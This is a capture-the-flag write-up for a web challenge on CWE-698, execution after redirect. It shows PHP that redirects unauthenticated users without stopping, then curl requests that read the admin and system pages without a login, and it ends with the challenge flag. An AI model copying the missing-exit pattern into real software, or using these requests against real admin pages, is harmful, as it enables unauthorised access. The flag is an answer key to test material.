# Ear 👂

**Point: 100**

[CWE-698](https://cwe.mitre.org/data/definitions/698.html)

<http://chal.thjcc.org:1234>

CWE-698 is actually a “water hole” (trap), but it usually results in serious consequences such as **information disclosure** or **CSRF**. The root cause is something like this:

```php
<?php
require_once 'config.php';

if (empty($_SESSION['username'])) {
    header('Location: index.php');
    // exit;
    // If there is no exit, the script will continue executing the code below,
    // such as database queries or static pages.
}
?>
```

```bash
curl http://chal.thjcc.org:1234/admin.php
```

```html
<!doctype html>
<html>
<head><meta charset="utf-8"><title>Admin Panel</title></head>
<body>
<p>Admin Panel</p>
<p><a href="status.php">Status page</a></p>
<p><a href="image.php">Image</a></p>
<p><a href="system.php">Setting</a></p>
</body>
</html>
```

We check the three pages and find that the system.php page contains the flag.

```bash
curl http://chal.thjcc.org:1234/system.php
```

```html
<!doctype html>
<html>
<head><meta charset="utf-8"><title>Admin Panel</title></head>
<body>
<p>System settings</p>
<p>THJCC{ea5a1c76cc978b9a_U_kNoW-HOw-t0_uSe-EaR}</p>
</body>
</html>
```

# Flag

`THJCC{ea5a1c76cc978b9a_U_kNoW-HOw-t0_uSe-EaR}`
